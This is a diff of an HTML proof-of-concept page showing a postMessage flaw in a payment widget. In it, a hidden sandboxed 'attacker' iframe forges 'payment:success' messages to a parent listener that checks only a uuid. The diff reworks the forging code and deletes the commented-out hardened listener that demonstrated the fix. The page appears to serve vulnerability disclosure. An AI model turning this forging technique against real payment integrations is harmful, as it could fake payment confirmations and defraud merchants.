@@ -14,8 +14,7 @@
 <ol>
   <li>Embeds the real widget iframe (staging).</li>
   <li>Parent has a <b>vulnerable</b> message listener (only checks <code>uuid</code>).</li>
-  <li>A sibling “attacker” iframe sends a forged <code>postMessage</code> (origin will be <code>null</code>).</li>
-  <li>Log shows both real and forged messages being dispatched by the vulnerable listener.</li>
+  <li>A sandboxed “attacker” iframe (origin = <code>null</code>) forges a message via <code>postMessage</code>.</li>
 </ol>
 
 <div class="row">
@@ -31,27 +30,32 @@
   Amount: <input id="amount" value="1" size="4" />
   Currency: <input id="currency" value="USD" size="5" />
   <button id="send">Send forged postMessage</button>
-  <span class="muted">| (forged message is sent from a data: iframe → <code>origin = "null"</code>)</span>
+  <span class="muted">| forged message comes from sandboxed iframe → <code>origin = "null"</code></span>
 </div>
 
 <h2>Log</h2>
 <div id="log">(no events yet)</div>
 
-<!-- Real widget iframe goes here -->
+<!-- Real widget iframe -->
 <div class="row">
   <iframe id="victim" width="420" height="280" title="Widget iframe"></iframe>
 </div>
 
-<!-- Hidden attacker iframe (origin will be "null" because it's a data: URL) -->
+<!-- Attacker iframe: sandboxed + srcdoc (opaque origin => e.origin === "null") -->
 <iframe id="attacker" width="0" height="0" style="visibility:hidden"
-  src="data:text/html,<!doctype html><meta charset='utf-8'>
+  sandbox="allow-scripts"
+  srcdoc='<!doctype html><meta charset="utf-8">
 <script>
-  function sendForged(uuid, evt, amount, currency){
-    const payload = { uuid: uuid, event: evt, amount: Number(amount), currency: currency };
-    parent.postMessage(payload, '*'); /* forged message from opaque (null) origin */
-  }
+// Wait for parent to send us a config; then forge a message back to parent.
+// Note: this frame is sandboxed, so its origin is "null".
+window.addEventListener("message", (e) => {
+  if (!e || !e.data || e.data.type !== "config") return;
+  const { uuid, evt, amount, currency } = e.data;
+  const payload = { uuid: uuid, event: evt, amount: Number(amount), currency: currency };
+  parent.postMessage(payload, "*"); // send forged message to parent (origin will be "null")
+});
 </script>
-<body>attacker ready</body>"></iframe>
+<body>attacker ready</body>'></iframe>
 
 <script>
   // ---------- Utilities ----------
@@ -72,22 +76,7 @@
     CURRENT_UUID = getUuidFrom($('widgetUrl').value);
   });
 
-  // ---------- 1) Embed the REAL widget iframe ----------
-  $('embed').onclick = () => {
-    const url = $('widgetUrl').value.trim();
-    $('victim').src = url;
-    log('[Parent] Embedded widget:', url);
-
-    // Auto-fire a forged message shortly after embed (for screenshot-friendly demo)
-    setTimeout(() => {
-      const uuid = getUuidFrom(url) || 'DEMO-UUID-123';
-      const attackerWin = $('attacker').contentWindow;
-      attackerWin.sendForged(uuid, 'payment:success', 1, 'USD');
-      log('[Attacker] Sent forged message to parent with uuid =', uuid, '(origin will be null)');
-    }, 1200);
-  };
-
-  // ---------- 2) Vulnerable parent listener (demonstrates the bug) ----------
+  // ---------- Vulnerable parent listener (demonstrates the bug) ----------
   window.addEventListener('message', (e) => {
     // ❌ VULNERABLE: no origin/source verification — accepts any sender that matches uuid
     if (e && typeof e.data === 'object' && e.data.uuid && e.data.uuid === CURRENT_UUID) {
@@ -98,7 +87,27 @@
     }
   });
 
-  // ---------- 3) Manual forged send (button) ----------
+  // Send config to attacker iframe (cross-origin safe)
+  function sendConfigToAttacker(uuid, evt, amount, currency){
+    const attackerWin = $('attacker').contentWindow;
+    attackerWin.postMessage({ type: 'config', uuid, evt, amount, currency }, '*');
+  }
+
+  // ---------- 1) Embed widget & auto-forge ----------
+  $('embed').onclick = () => {
+    const url = $('widgetUrl').value.trim();
+    $('victim').src = url;
+    log('[Parent] Embedded widget:', url);
+
+    // After a short delay, instruct attacker to forge the message
+    setTimeout(() => {
+      const uuid = getUuidFrom(url) || 'DEMO-UUID-123';
+      sendConfigToAttacker(uuid, 'payment:success', 1, 'USD');
+      log('[Parent] Asked attacker to forge message with uuid =', uuid);
+    }, 1200);
+  };
+
+  // ---------- 2) Manual forged send ----------
   $('send').onclick = () => {
     const url = $('widgetUrl').value.trim();
     const uuid = getUuidFrom(url) || 'DEMO-UUID-123';
@@ -106,39 +115,7 @@
     const amt  = $('amount').value.trim() || '1';
     const cur  = $('currency').value.trim() || 'USD';
 
-    const attackerWin = $('attacker').contentWindow;
-    attackerWin.sendForged(uuid, evt, amt, cur);
-    log('[Attacker] Sent forged message to parent with uuid =', uuid, '(origin will be null)');
+    sendConfigToAttacker(uuid, evt, amt, cur);
+    log('[Parent] Asked attacker to forge message with uuid =', uuid);
   };
-
-  // ---------- (Optional) Hardened listener (contrast / fix) ----------
-  // Uncomment this block to demonstrate the proper fix that rejects the forged message:
-  /*
-  (function addHardenedListener(){
-    // Set after widget is embedded; if you need dynamic, rebind after 'embed'
-    let expectedOrigin = null;
-    let childWindow = null;
-
-    const setHandles = () => {
-      try {
-        const url = $('widgetUrl').value.trim();
-        expectedOrigin = new URL(url).origin;             // e.g., https://multipay.staging.komoju-dev.com
-      } catch(_) { expectedOrigin = null; }
-      childWindow = $('victim').contentWindow || null;
-    };
-    setHandles();
-    // Recompute handles after embedding
-    $('embed').addEventListener('click', () => setTimeout(setHandles, 0));
-
-    window.addEventListener('message', (e) => {
-      if (!expectedOrigin || !childWindow) return;
-      if (e.origin !== expectedOrigin) return;            // ✅ origin check
-      if (e.source !== childWindow) return;               // ✅ window identity check
-      if (e && typeof e.data === 'object' && e.data.uuid === CURRENT_UUID) {
-        log('[Parent] DISPATCH (hardened): origin =', String(e.origin),
-            ' event =', e.data.event, ' data =', e.data);
-      }
-    });
-  })();
-  */
 </script>
